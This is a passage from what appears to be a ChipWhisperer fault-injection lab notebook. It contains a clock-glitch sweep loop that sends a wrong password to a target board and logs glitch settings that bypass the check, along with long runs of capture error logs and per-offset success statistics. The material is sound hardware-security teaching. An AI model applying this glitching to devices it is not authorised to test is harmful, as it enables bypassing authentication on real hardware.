      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n",
      "CWbytearray(b'01')\n",
      "1.953125 -3.515625 48\n",
      "🐙Trigger still high!\n",
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n",
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:508) Unexpected frame byte in CWbytearray(b'00 00 00')\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:285) Device did not ack\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CWbytearray(b'01')\n",
      "3.515625 -1.953125 48\n",
      "🐙"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    }
   ],
   "source": [
    "from tqdm.notebook import tqdm\n",
    "import re\n",
    "import struct\n",
    "from chipwhisperer import logging\n",
    "# gc.set_global_step(step)\n",
    "cw.glitch_logger.setLevel(logging.ERROR)\n",
    "\n",
    "\n",
    "# replace these with your settings from the last part\n",
    "# The example width/offset settings shown here are for CW-Lite/Pro; width/offset are expressed differently for Husky (see Fault 1_1)\n",
    "gc.set_range(\"width\", 0.8, 3.6)\n",
    "gc.set_range(\"offset\", -4, -2)\n",
    "\n",
    "step = 0.4\n",
    "gc.set_global_step(step)\n",
    "\n",
    "# you can leave this range for ext_offset\n",
    "gc.set_range(\"ext_offset\", 0, 100)\n",
    "gc.set_step(\"ext_offset\", 1)\n",
    "scope.adc.timeout = 0.1\n",
    "scope.glitch.repeat = 1\n",
    "reboot_flush()\n",
    "\n",
    "for glitch_settings in gc.glitch_values():\n",
    "    scope.glitch.offset = glitch_settings[1]\n",
    "    scope.glitch.width = glitch_settings[0]\n",
    "    scope.glitch.ext_offset = glitch_settings[2]\n",
    "    if scope.adc.state:\n",
    "        # can detect crash here (fast) before timing out (slow)\n",
    "        print(\"Trigger still high!\")\n",
    "        gc.add(\"reset\")\n",
    "\n",
    "        #Device is slow to boot?\n",
    "        reboot_flush()\n",
    "\n",
    "    scope.arm()\n",
    "    target.simpleserial_write('p', bytearray([0x00]*5)) #send an incorrect password\n",
    "\n",
    "    ret = scope.capture()\n",
    "\n",
    "    if ret:\n",
    "        print('Timeout - no trigger')\n",
    "        gc.add(\"reset\")\n",
    "\n",
    "        #Device is slow to boot?\n",
    "        reboot_flush()\n",
    "\n",
    "    else:\n",
    "        val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50) #For loop check\n",
    "        \n",
    "        if not val['valid']: #fill in with invalid response detection\n",
    "            gc.add(\"reset\")\n",
    "        else:\n",
    "            payl = int.from_bytes(val['payload'], byteorder='little', signed=True)\n",
    "            if payl == 1: # replace this\n",
    "                gc.add(\"success\")\n",
    "                print(val['payload'])\n",
    "                print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)\n",
    "                print(\"🐙\", end=\"\")\n",
    "            else:\n",
    "                gc.add(\"normal\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "For this lab, you may want two copies of your results; one for finding effective ext_offsets:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[((48,),\n",
       "  {'total': 49,\n",
       "   'success': 3,\n",
       "   'success_rate': 0.061224489795918366,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 45,\n",
       "   'normal_rate': 0.9183673469387755}),\n",
       " ((45,),\n",
       "  {'total': 48,\n",
       "   'success': 1,\n",
       "   'success_rate': 0.020833333333333332,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((44,),\n",
       "  {'total': 48,\n",
       "   'success': 1,\n",
       "   'success_rate': 0.020833333333333332,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((4,),\n",
       "  {'total': 48,\n",
       "   'success': 1,\n",
       "   'success_rate': 0.020833333333333332,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((100,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((99,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.0625,\n",
       "   'normal': 45,\n",
       "   'normal_rate': 0.9375}),\n",
       " ((98,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((97,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((96,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((95,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((94,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((93,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((92,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((91,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((90,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.0625,\n",
       "   'normal': 45,\n",
       "   'normal_rate': 0.9375}),\n",
       " ((89,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.0625,\n",
       "   'normal': 45,\n",
       "   'normal_rate': 0.9375}),\n",
       " ((88,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((87,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((86,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((85,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((84,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((83,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.0625,\n",
       "   'normal': 45,\n",
       "   'normal_rate': 0.9375}),\n",
       " ((82,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.0625,\n",
       "   'normal': 45,\n",
       "   'normal_rate': 0.9375}),\n",
       " ((81,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((80,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((79,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((78,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((77,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((76,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((75,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((74,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((73,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((72,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((71,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.0625,\n",
       "   'normal': 45,\n",
       "   'normal_rate': 0.9375}),\n",
       " ((70,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((69,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((68,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((67,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((66,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((65,),\n",
       "  {'total': 48,\n",
